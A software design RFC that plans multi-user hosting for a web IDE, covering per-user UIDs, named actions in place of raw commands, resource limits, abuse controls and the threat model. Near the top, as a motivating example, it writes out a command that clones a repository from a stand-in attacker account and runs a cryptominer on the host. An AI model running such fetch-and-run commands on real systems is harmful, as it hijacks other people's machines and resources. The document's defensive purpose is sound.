# RFC: Multi-user hosting

**Status:** proposed — needs review before enforcement code is written
**Related:** issue #2 (`WEBER_SANDBOX` enforces nothing), `docs/OPEN-QUESTIONS.md` §1

---

## The problem, stated honestly

Weber today is a **single-user** tool. Exposing it to "anyone with a GitHub
account" would not publish an IDE; it would publish a remote code execution
service. That is not a configuration gap — it is the current design working as
intended, and it must change before a public URL exists.

Concretely, with OAuth enabled and every GitHub login allowed, any account can:

```bash
# both allow-listed today
git clone https://github.com/attacker/miner
bun run mine.js
```

That runs on your host, on your bill. And because all users share
`WORKSPACE_ROOT`, your files are their files.

Three independent defects have to be fixed, in this order, and **none of them
is optional**:

| # | Defect | Consequence if unfixed |
|---|---|---|
| 1 | Everyone shares one workspace | Users read and delete each other's files |
| 2 | Cells run in-process via `new Function` | A cell reads `process.env` and the whole filesystem |
| 3 | No resource limits | One user exhausts CPU, memory or disk for everyone |

There is also a **fourth, non-technical** requirement: an abuse path. A public
service that runs arbitrary code will be found and used. Without rate limits
and an off switch, the first incident is unrecoverable.

---

## Decision 1 — Isolation model

**Chosen: one OS process per user, with a per-user workspace root.**

### Options considered

| Option | Isolation | Ops cost | Verdict |
|---|---|---|---|
| Shared process, path-prefixed workspaces | **None** — one `new Function` escapes it | Lowest | **Rejected.** Path prefixes do not contain code execution. |
| Worker thread per user | **None** — shared heap and `process` | Low | **Rejected.** A worker is a concurrency tool, not a security boundary. |
| Subprocess per user, same UID | Good for files, weak for escape | Medium | **Rejected.** A subprocess running as `fufu` can read every other user's files. |
| **Subprocess per user, distinct UID + per-user workspace** | Good | Medium | **Chosen** for the first iteration |
| Container/VM per user | Strongest | High | Deferred — see below |

### Why not containers first

I tried to stand up rootless podman on the target host and could not: the
multi-ID mapping that `/etc/subuid` implies needs a setuid `newuidmap`, which
an unprivileged user cannot install. That is a kernel-enforced boundary, not a
misconfiguration (the full investigation is in `deploy/`). Containers may be
the right end state, but they cannot be the *first* step here, and a design
that assumes them would not be deployable today.

### What "distinct UID" actually buys

Each user gets a system account (`weber-u<id>`), their own workspace directory
owned by that account, and the core drops privileges when spawning their work.
This means:

- the filesystem boundary is enforced by the **kernel**, not by string checks
- a notebook cell running as `weber-u7` cannot read `/home/fufu/weber-workspaces`
- a bug in the path sandbox is no longer sufficient for lateral movement

**It does not** protect against kernel exploits or container escapes. That is
the honest limit, and it is why the container work stays on the roadmap rather
than being declared unnecessary.

---

## Decision 2 — Code execution policy

**Chosen: no arbitrary command execution in multi-user mode.**

The single-user allow-list (`bun`, `git`, `python`, ...) is far too broad when
the caller is a stranger. In shared mode the API exposes **named actions**, not
`argv`:

| Action | Runs |
|---|---|
| `install` | `bun install` |
| `test` | `bun test` |
| `build` | `bun run build` |
| `format` | `bun run format` |

Each action is a fixed argv constructed server-side. **A user cannot influence
the command, only the workspace it runs in.**

Cells still evaluate, but in a subprocess as the user's own UID with a scrubbed
environment — `process.env` in a cell must never see `GITHUB_CLIENT_ID`,
`WEBER_SESSION_SECRET` or anything else from the core's environment.

---

## Decision 3 — Resource limits

Enforced by the parent process, not requested politely:

| Resource | Limit | Enforcement |
|---|---|---|
| CPU time per action | 60s wall | SIGKILL on timeout |
| Memory per process | 512 MB | `ulimit -v` in the child |
| Output captured | 1 MB | already implemented in `ExecService` |
| Disk per workspace | 100 MB | quota check before write |
| Concurrent actions per user | 2 | server-side semaphore |
| Rows/values per notebook run | 10k | engine bound |

Without these, "one user runs a fork bomb" is not a hypothetical.

---

## Decision 4 — Abuse controls

- **Sign-in gating.** Keep `WEBER_ALLOWED_LOGINS`. "Any GitHub account" and
  "runs my code" must remain separate decisions; an open signup is a deliberate
  future choice, not a default.
- **Rate limits.** Per-session: N actions/minute, M sign-ins/hour.
- **Audit log.** Every action recorded with login, action, workspace, exit code
  and duration. This is the thing you need at 3am, and the thing that is
  impossible to add retroactively.
- **Kill switch.** `WEBER_READONLY=1` disables all execution while leaving read
  access, so an incident can be contained without taking the service down.

---

## Threat model, explicitly

**Defends against:** a curious or careless user reading another user's files;
a user running a miner or fork bomb; a user escaping their workspace via path
manipulation; a cell reading core secrets from `process.env`.

**Does NOT defend against:** a determined attacker with a kernel 0-day; abuse
of the GitHub account itself; traffic analysis; the operator (who can always
read everything, and should be told so).

**Out of scope for this iteration:** anonymous use, paid tiers, multi-region,
per-user custom domains.

---

## Delivery order

Each step is independently testable and independently useful:

1. **Design review** (this document) — no code until the model is agreed.
2. `WorkspaceRegistry`: user → workspace root, with per-user ownership.
   Testable without any privilege escalation.
3. Session → user mapping, so `readSession` yields a durable user identity.
4. Per-user limits (concurrency, disk, notebook bounds) — pure logic, fully
   testable in-process.
5. Named actions replacing raw `argv` in shared mode.
6. Subprocess cell evaluation with a scrubbed environment.
7. Audit log.
8. Deployment runbook: creating users, quotas, the kill switch, incident steps.

Steps 2–4 and 7 are ordinary TDD and can be verified here. **Step 6 changes
the notebook's semantics** — exported values must become serializable — so it
needs a product decision about cells that currently return functions or class
instances.

---

## The question this RFC is really asking

**Should Weber be multi-user at all?**

The README promises "code anywhere", and a hosted tier is the obvious way to
deliver that. But the project's core value is a *full IDE with a shell*, which
is in tension with safely hosting it for strangers. The alternatives are
legitimate and cheaper:

- **Keep it single-user**, and let people self-host. The Pages demo already
  shows the UI to anyone curious.
- **Hosted read-only playground**: the notebook in WebAssembly (Pyodide, which
  the README already promises), no filesystem, no shell. Genuinely safe, much
  less useful.
- **Full multi-user**, as designed above. Most useful, most work, most risk.

I recommend building steps 2–4 and 7 **regardless**, because they are the
foundation all three options share. But whether to make it public is your call,
and it should be made deliberately rather than by deploying and finding out.
